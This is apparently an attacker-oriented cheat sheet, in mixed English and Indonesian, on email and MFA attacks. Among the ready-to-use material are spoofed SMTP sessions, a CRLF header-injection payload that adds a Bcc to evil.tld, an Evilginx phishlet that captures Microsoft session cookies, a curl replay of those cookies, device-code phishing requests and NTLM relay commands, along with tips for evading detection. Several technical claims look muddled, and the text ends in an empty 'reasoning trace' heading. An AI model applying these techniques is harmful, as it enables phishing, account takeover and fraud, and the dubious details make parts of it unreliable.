# mail-security — misc

# Email Security: SPF/DKIM/DMARC Bypass, Spoofing Internal, Header Injection, Attachment Evasion, Phishing-Resistant MFA Bypass

## 1. Matriks Cepat

| Technique | Control target | Prerequisites | Effect on header | Detected by |
|---|---|---|---|---|
| SPF softfail pass via subdomain | SPF | domain has `~all`, subdomain not scoped by `include:` | `Received-SPF: softfail` then `Pass` | DMARC alignment check |
| DKIM replay (long-term key) | DKIM | 1024-bit key, selector not rotated | `d=`, `s=` valid, `ts=` old | ARC seal if present |
| DMARC `p=none` bypass | DMARC | policy `p=none` / `sp=none` | `Authentication-Results: dmarc=pass` palsu jika alignment longgar | manual header review |
| Display-name spoof internal | client UI | none | `From: "CFO" <ext@attacker.tld>` | user training, external banner |
| Envelope/Header mismatch | DMARC relaxed | `From:` aligned, `Return-Path:` bebas | `Return-Path: <bounce@attacker.tld>` | wewenang admin, jarang |
| Header injection via `\r\n` | MTA/SMTP | injection sink point in web form/mailer | additional headers (`Bcc:`, `Reply-To:`) | modern MTA reject CRLF |
| Attachment evasion | AV gateway | format MIME berlapis | `Content-Type: multipart/...` bersarang | sandbox, CDR |
| MFA fatigue / AiTM | MFA phishing-resistant | user bias toward push | N/A (session, not header) | FIDO2-only org |

## 2. SPF Bypass

### 2.1 Subdomain without scope (most common)
Domain `corp.example` has `v=spf1 include:_spf.google.com ~all`. Subdomain `mailer.corp.example` has no SPF TXT → SPF evaluation = `none`, but if DMARC `sp=none` and `aspf=r`, spoofing `From: alert@mailer.corp.example` passes relaxed alignment.

Cek cepat:
```bash
dig +short TXT corp.example | grep spf1
dig +short TXT mailer.corp.example
dig +short TXT _dmarc.corp.example
```
What is sent (EHLO + envelope):
```
EHLO attacker.tld
MAIL FROM:<bounce@mailer.corp.example>
RCPT TO:<victim@corp.example>
DATA
From: "IT Helpdesk" <alert@mailer.corp.example>
Subject: MFA reset
```
What appears at the recipient (Postfix + OpenDMARC 1.4.2):
```
Authentication-Results: mx.corp.example;
  spf=softfail (domain of bounce@mailer.corp.example ...) smtp.mailfrom=mailer.corp.example;
  dkim=none;
  dmarc=pass (p=NONE sp=NONE) header.from=mailer.corp.example
```
Why it works: `sp=none` → subdomain does not get reject policy; `relaxed` alignment accepts the same organizational domain.

Mitigation check: `_dmarc` must have `sp=reject`, or wildcard TXT `v=spf1 -all` on unused subdomains.

### 2.2 `include:` chain on third-party domains
Marketing SaaS uses `include:_spf.provider.tld`. If the provider tld is loose (e.g. `~all` and there are shared IPs not under control), send from an IP within that `include:` range → `spf=pass`.

Range verification:
```bash
dig +short TXT _spf.provider.tld
whois -h whois.arin.net "n 203.0.113.0/24" | head
```
Check whether the IP is still announced (stale SPF): compare `_spf.provider.tld` with the ASN owning the block; many includes contain legacy IP blocks that have been sold.

### 2.3 SPF 10-DNS-lookup limit & `void lookup`
Exceeding the limit → `permerror` → DMARC fallback. If the receiver incorrectly treats `permerror` as `none` and policy `p=none` → spoof passes. Test:
```bash
spfquery -ip=203.0.113.10 -sender=ceo@corp.example -helo=mail.corp.example
# atau
python3 -m pyspf ceo@corp.example 203.0.113.10 mail.corp.example
```

## 3. DKIM Bypass

### 3.1 Selector not rotated + old key leaked
Selector `s1` (1024-bit) is still public in DNS even though the MTA already uses `s2`. Resend the old signature.
Ambil record:
```bash
dig +short TXT s1._domainkey.corp.example
# v=DKIM1; k=rsa; p=MIGfMA0G...IDAQAB
```
What appears:
```
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
  d=corp.example; s=s1; t=1699999999; h=from:to:subject:date;
  bh=...; b=...
Authentication-Results: dkim=pass header.d=corp.example header.s=s1
```
Why it works: the verifier only checks the key on the selector used; there is no key age check. Mitigation: delete the old selector TXT, rotate every 6–12 months, empty `p=` to revoke.

### 3.2 Body canonicalization `relaxed` + tambah whitespace
`c=relaxed/relaxed` allows whitespace modification in the body without breaking `bh=`. If a transit MTA adds `Received:` in the body (rare) or a gateway normalizes line endings, the signature remains valid. Test:
```bash
opendkim-testmsg -k s1.private < message.eml
```
Resend with `cat message.eml | sed 's/$/ /' | sendmail -t` — the signature still passes under `relaxed`.

### 3.3 Lâyered signature stripping
If the domain signs `h=from:to:subject:date:message-id`, headers outside `h=` (e.g. `Reply-To`, `Return-Path`, `X-*`) can be modified without breaking the signature. Inject `Reply-To: attacker@evil.tld` → user replies go to the attacker, `dkim=pass` remains.

## 4. DMARC Bypass

### 4.1 `p=none` + aggregates not monitored
```
v=DMARC1; p=none; rua=mailto:dmarc@corp.example
```
Send with the exact domain in `From:` → `dmarc=pass` (via SPF or DKIM alignment) or `fail` with no consequence. What appears in the user's client: a normal message, no banner (the banner is only set if the gateway sets it based on `dmarc=fail`).

### 4.2 Alignment relaxed vs strict mismatch
```
v=DMARC1; p=reject; aspf=r; adkim=r
```
Spoof `From: ceo@sub.corp.example`, envelope `MAIL FROM:<x@corp.example>` (SPF pass on the organizational domain) → `spf=pass` + relaxed alignment (same organizational domain) → DMARC pass even though the `From` is a different subdomain. Mitigation: `aspf=s; adkim=s`.

### 4.3 `fo=` & forensic report suppression
`ruf=` is often ignored by receivers (Google/Microsoft do not send forensic). `fo=1` does not add detection in the field.

### 4.4 Multi-From / `Resent-From`
Many clients (Outlook 365 Web, Windows 11 24H2 Mail) display the first `From:`. The `Resent-From:` header is ignored by DMARC (DMARC only checks RFC5322.From). Inject:
```
Resent-From: ceo@corp.example
From: attacker@evil.tld
```
DMARC evaluates `From:` (evil.tld, possibly passing the attacker's SPF) — the user sees `Resent-From`. Confirm the target client: Outlook desktop displays the real From, but some webmails display Resent.

## 5. Spoofing Internal

### 5.1 Display-name spoof (universal)
```
From: "Chief Financial Officer" <invoice@attacker.tld>
Reply-To: cfo-finance@attacker.tld
```
No header mechanism prevents it. What fails in the field: gateways that have deployed an external-sender banner (`[EXTERNAL]`) — trained users see the prefix.

### 5.2 Same-domain spoof via compromised guest Wi-Fi / internal relay
If the internal MTA accepts relay from `10.0.0.0/8` without auth, send from an internal IP:
```bash
swaks --to victim@corp.example --from ceo@corp.example \
  --server 10.10.20.5:25 --h-From:'"CEO" <ceo@corp.example>' \
  --body 'Wire needed' --header 'X-Originating-IP: 10.10.20.5'
```
Postfix's default `mynetworks` often contains `127.0.0.0/8` + internal subnets → `permit_mynetworks` bypasses auth. Check `postconf mynetworks`.

### 5.3 Lookalike domain + SPF valid
Register `corp-example.tld` (hyphen), set up SPF `v=spf1 ip4:203.0.113.10 -all`, own DKIM. All auth **passes for the attacker's domain**, nothing fails. The only detection: domain similarity (Microsoft Defender for O365 `Impersonation` policy, Proofpoint `BEC` classifier).

### 5.4 Envelope spoof for bounce reflection
`MAIL FROM:<ceo@corp.example>` to an open relay → the `NDR` bounce is sent to `ceo@corp.example` with a body containing the payload → the user sees an email from `MAILER-DAEMON@corp.example` (internal). NDR bodies often bypass filters because the sender is internal.

## 6. Header Injection

### 6.1 SMTP header injection via web form
A contact form that concatenates `To:`/`Subject:` from user input, without sanitizing `\r\n`.
Payload:
```
email=victim@corp.example%0d%0aBcc:attacker@evil.tld
```
Legacy PHP `mail()` (before 8.0, the `mail()` function does not block in `additional_headers`):
```php
mail($to, $_POST['subject'], $body, "From: ".$_POST['email']);
```
What appears in the Postfix log:
```
postfix/smtpd[1234]: ... from=<web@corp.example>, to=<victim@corp.example>, relay=...
postfix/cleanup[1235]: ... message-id=<...>
# envelope RCPT bertambah attacker@evil.tld
```
Why it fails on modern systems: PHP 8.0+ `mail()` validates headers; Postfix 3.x rejects `\r\n` in DATA headers with `550 5.6.0`; modern MTAs (Exim 4.96) have `header_syntax = relaxed` which rejects it.

### 6.2 Inject `Content-Type` for MIME confusion
```
Subject: invoice
Content-Type: multipart/mixed; boundary="A"

--A
Content-Type: text/html

...
--A
Content-Type: application/pdf
Content-Transfer-Encoding: base64

<PDF header bytes base64>
```
Sent via direct SMTP DATA (not via an auto-encoding library). Goal: the gateway detects the first `Content-Type: text/plain` in the body but there is a second part that is not scanned. Fleet test: look at the headers added by the gateway (`X-Proofpoint-*`, `X-Mimecast-Spam-Score`); part count mismatch = indicator.

### 6.3 `Received:` forging (chain of custody)
If the MTA accepts `Received:` from the client without stripping, an attacker can inject:
```
Received: from mail.corp.example (mail.corp.example [10.10.20.5])
  by mx.corp.example with ESMTP id ABC123
  for <victim@corp.example>; Mon, 1 Jan 2025 10:00:00 +0000
```
To make the email appear to originate from an internal hop. Default Postfix `header_checks` does not remove `Received:` from the client, only adds the topmost one. In the logs, two top `Received:` headers appear with mismatched IPs. Detection: compare the top `Received: from` with the border MTA's `X-Originating-IP` / `Authentication-Results`.

## 7. Attachment Evasion

| Trick | Example payload | Failing gateway | Resistant gateway |
|---|---|---|---|
| Double extension | `invoice.pdf.exe` | Outlook Web 2019 (render `.exe`) | Defender for O365, Chrome 131 download warning |
| ISO/IMG container | `dhl.iso` (berisi `.lnk`) | Mimecast pra-2019 | modern sandbox (mount ISO) |
| `.lnk` to `powershell.exe -w hidden -c IEX(...)` | | static AV | AMSI / sandbox |
| Password-protected ZIP | `inv.zip` (pass: `1234`) | AV without extraction | CDR, sandbox with wordlist |
| Polyglot PDF/JS | `inv.pdf` header `%PDF` + JS in stream | signature engine | render-based detection |
| HTML smuggling | `.html` with `<script>` Blob → `.iso` | AV that does not render | browser isolation |
| OLE (.docm) macro `AutoOpen` | `vbaProject.bin` | macro-scan statis | AMSI, Office 2024 macro-block |
| SVG + `<foreignObject>` | | filter HTML | render engine |
| MIME nested `multipart/alternative` → `application/octet-stream` | | parser depth terbatas | parser max depth |

Example nested MIME structure that often bypasses naive parsers:
```
Content-Type: multipart/mixed; boundary="outer"
--outer
Content-Type: multipart/alternative; boundary="inner"
--inner
Content-Type: text/plain

see attached
--inner
Content-Type: application/octet-stream; name="a.bin"
Content-Transfer-Encoding: base64
--inner--
--outer
Content-Type: application/zip; name="real.zip"
--outer--
```
A gateway that only scans the first part (`text/plain`) and assumes the `a.bin` attachment is harmless, while `real.zip` contains `.hta` in the second part.

Extract/verify in the lab:
```bash
# Cek struktur multipart
python3 -c "import email,sys; m=email.message_from_file(open(sys.argv[1])); [print(p.get_content_type(), p.get_filename()) for p in m.walk()]" msg.eml
# Simulasi gateway
docker run --rm -v $PWD:/data r.j3ss.co/clamav clamscan -r /data
```
Measure effectiveness by sending samples to a Canary address (e.g. `canarytokens.org`), see which part is blocked.

## 8. Phishing-Resistant MFA Bypass

### 8.1 AiTM reverse proxy (Evilginx3, Modlishka)
Proxy in front of `login.microsoftonline.com` (or Okta/Google). FIDO2 user authentication still passes because the browser TLS connects to the proxy, and the proxy TLS connects to the real IdP. What is captured: session cookie (`ESTSAUTH`, `ESTSAUTHPERSISTENT`, `x-ms-RefreshTokenCredential`).
Evilginx configuration (v3.3.0):
```yaml
# phishlets/microsoft.yaml (ringkas)
proxy_hosts:
  - {phish_sub: 'login', orig_sub: 'login', domain: 'login.microsoftonline.com', session: true, is_landing: true}
auth_tokens:
  - domain: 'login.microsoftonline.com'
    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT']
```
Ekstraksi cookie + import:
```bash
# Curl replay dengan cookie hasil capture
curl -s 'https://outlook.office.com/mail/' \
  -H 'Cookie: ESTSAUTH=<value>; ESTSAUTHPERSISTENT=<value>' \
  -o /dev/null -w '%{http_code}\n'
```
What fails in the field: Conditional Access `Compliant device` / `Token protection` (Entra `Token Protection for Sign-in Sessions`, 2023+) binds the token to the device, replay is rejected with `AADSTS50196`. Check `signin logs → Authentication requirement`.

### 8.2 FIDO2 bypass via fallback
If the org has FIDO2 but `Security Defaults`/**CA** has not yet set `Require phishing-resistant MFA`, the attacker triggers an error on FIDO2 (e.g. `AADSTS50072`) and then the user chooses an alternate method (`SMS`, `Voice`). Consent frame:
```
"Your security key is not recognized. Choose alternate verification."
```
`SMS`/`OTP` method → captured by the proxy. Mitigation: CA `Authentication strength: Phishing-resistant MFA` for all users, disable `SMS/Voice` for admins.

### 8.3 MFA fatigue (push bombing)
The `Microsoft Authenticator` service (Android 13+, iOS 17) supports `number matching`. If the tenant has not enforced it (default since Nov 2022 but can be off), a push `Approve` without a number → the user clicks.
```bash
# loop request push ke target (butuh credential primer)
# contoh via Device Code flow agar attacker punya token primer
curl -X POST 'https://login.microsoftonline.com/<tenant>/oauth2/v2.0/devicecode' \
  -d 'client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46&scope=User.Read offline_access'
# kirim user_code ke target; setelah approve, poll token
curl -X POST 'https://login.microsoftonline.com/<tenant>/oauth2/v2.0/token' \
  -d 'grant_type=urn:ietf:params:oauth:grant-type:device_code&client_id=...&device_code=...'
```
What fails in the field: Conditional Access `Require compliant device` + `Sign-in risk` (Entra ID P2) blocks the token even if MFA succeeds; `Token Protection` blocks replay.

### 8.4 Push MFA + same-device approval
If `Authenticator` is reset and then installed on the same device as the login session, `number matching` passes automatically. Prerequisite: loss of device control, the user re-enrolls on the attacker's device — requires initial access.

### 8.5 Kerberos / NTLM relay — bypass MFA entirely
MFA does not protect NTLM/Kerberos. Example: `ntlmrelayx` (impacket 0.12.0) relays to `LDAP`/`SMB` for AD queries (not application auth):
```bash
impacket-ntlmrelayx -t ldaps://dc.corp.example --dump-laps --escalate-user attacker
# trigger via Responder pada subnet user
responder -I eth0 -wrv
```
What fails: `LDAP signing` + `Channel binding` (KB4520412) kills relay to LDAPS; `SMB signing` defaults to `required` in Windows Server 2025/11 24H2.

## 9. Reference Header Examples (sent vs received)

**Spoof internal via subdomain `p=none`** — dikirim:
```
MAIL FROM:<bounce@mailer.corp.example>
From: "IT Service Desk" <alert@mailer.corp.example>
To: victim@corp.example
Subject: Re-authentication required
Date: Mon, 01 Jan 2025 08:00:00 +0000
Message-ID: <20250101080000.1234@mailer.corp.example>
MIME-Version: 1.0
Content-Type: text/html
```
Received (Postfix 3.8 + OpenDMARC 1.4.2):
```
Return-Path: <bounce@mailer.corp.example>
Received-SPF: Pass (mailfrom) identity=mailfrom; client-ip=203.0.113.10;
  helo=mailer.corp.example; envelope-from=bounce@mailer.corp.example;
  receiver=mx.corp.example
Authentication-Results: mx.corp.example;
  spf=pass smtp.mailfrom=mailer.corp.example;
  dkim=none;
  dmarc=pass (p=NONE sp=NONE) header.from=mailer.corp.example
Received: from mailer.corp.example (203.0.113.10) by mx.corp.example
```
Why it passes: the organizational domain `corp.example` aligns (relaxed), `sp=NONE`, there is no DKIM so SPF becomes the only signal that passes.

**DKIM replay `s1`** — received:
```
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=corp.example; s=s1;
  t=1699999999; h=from:to:subject:date:message-id; bh=...; b=...
Authentication-Results: mx.corp.example; dkim=pass header.d=corp.example
  header.s=s1 header.b=...; dmarc=pass header.from=corp.example
```
Why it passes: the verifier does not check `t=` (timestamp) against key age; only signature validity against the public key `s1`.

## 10. Operational Pitfalls (causes of field failures)

- **Precedence & `Auto-Submitted`**: Gmail/Outlook lower the priority of messages with `Precedence: bulk`/`Auto-Submitted: auto-replied` — internal spoofs often do not reach the inbox, going to Spam. Test the sender's default headers first.
- **`Message-ID` redundancy**: the gateway (`X-Microsoft-Antispam: BCL`) uses a `Message-ID` domain mismatch as a signal; generate the `Message-ID` with the target domain, not the attacker domain.
- **SPF `void lookup` limit (2)**: RFC 7208 §4.6.4 limits to 2 `void lookup`s. An `_spf` include that has an empty record triggers `permerror`. Postfix/OpenDMARC 1.4.2 maps `permerror` to `dmarc=fail` in some configs — the spoof fails instead.
- **DKIM `l=` tag**: if `l=` (length) is present, only the body prefix is signed; appending text to the body preserves `dkim=pass`. But many verifiers (Rspamd 3.8) already have `dkim_l_tag_reject` query — the spoof fails.
- **Gmail `external sender` + `ARC`**: Gmail (2024+) signs ARC; if an internal forwarder adds an ARC seal, a spoof with fake `Authentication-Results` is rejected (`arc=fail`). Do not freeze `Authentication-Results` from the sent headers; the border MTA strips it.
- **`Resent-From`**: Outlook desktop (Windows 11 24H2, build 26100.2605) displays `From`, but **OWA/Outlook Web** displays `Resent-From` as primary. Test the victim's client before use.
- **Modern MTA CRLF rejection**: Exim 4.98 `header_syntax=relaxed` (default) + Postfix 3.x `smtpd_forbid_bare_newline=yes` (3.9 default `normalize`) block injection. A `\r\n` payload without `\n` (bare CR) is still rejected.
- **Nested multipart depth**: Rspamd `max_mime_parts` (default 100) and `mime_types_processing` parse deeper than estimated; second-part bypass in the field only if the gateway uses a custom parser.
- **ISO on Windows 11 24H2**: Windows 11 24H2 by default **blocks mounting ISO** from the internet zone (MOTW) for marked files — the offline `.iso` vector is much stronger than online.
- **AiTM vs `Token Protection`**: tenants with `Token Protection for Sign-in Sessions` (Entra ID P1, preview 2023, GA 2024) make cookie replay fail even when captured. Check `GET /v1.0/policies/...` or the sign-in log `tokenProtectionStatus`.
- **Device Code flow blocked**: Microsoft began (2024) blocking device code flow for some tenants with the CA `Block device code flow`. Check `Entra → Authentication methods → Device code`.
- **Evilginx cert & HSTS**: if the phishing domain is HSTS-preloaded, the browser does a 307 internal redirect to the proxy HTTPS → cert mismatch triggers an interstitial. Use a new domain, don't use a domain that has ever been submitted to HSTS preload.
- **FIDO2 fallback disabled**: tenants with the CA `Authentication strength: Phishing-resistant` disable SMS/OTP fallback; all AiTM techniques in §8.1/8.2 fail completely.
- **Postfix `mynetworks`**: if `10.0.0.0/8` is in `mynetworks`, the relay is an internal open relay — but many orgs already have `smtpd_recipient_restrictions = permit_sasl_authenticated, reject` with a minimal `mynetworks`. Verify `postconf mynetworks` before assuming relay.
- **Attachment blocking by extension**: many gateways (Mimecast, Proofpoint) block `.iso`, `.img`, `.lnk`, `.hta` in their default lists — even though a double extension `invoice.pdf.iso` is detected as `.iso`. Test the target extension per gateway, don't generalize.
- **DKIM timestamp skew**: a `t=` that is too old (years) triggers `dkim=fail (signature expired)` in verifiers with `dkim_timeout` (Rspamd `dkim_allow_old_timestamps=false` default). Limit `t=` to within a ±30 day window.


---

## [reasoning trace]


